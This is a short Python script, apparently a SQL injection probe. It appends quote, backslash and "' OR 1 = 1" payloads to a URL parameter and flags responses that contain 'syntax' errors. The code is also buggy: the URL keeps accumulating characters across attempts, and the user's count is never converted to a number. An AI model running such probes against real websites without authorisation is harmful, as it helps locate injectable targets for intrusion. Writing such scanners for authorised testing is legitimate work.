#! /usr/bin/env python3

import requests
from requests.models import parse_url

def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      #code to find the break to break query.
    
    char = []
    print("Trying to break the query...")
    for i in list:
        url = url+param+"=1"+i
        print(url)
        r=requests.get(url)
        if "syntax" in (str(r.content)):
            char.append(i)


    if not char : #checks if the char array is empty or not
        print("No possible characters found.")
        option = input("Do you want to try out your own characters? [y/n]")
        if option.lower() == 'y' :
            num = input("Enter number of characters you want to enter : ")
            print("Enter characters : ")
            for i in range(num) :
                list.append(input())
            
            escape(url,param,list) #recursive function with the updated list of characters

    return char
            

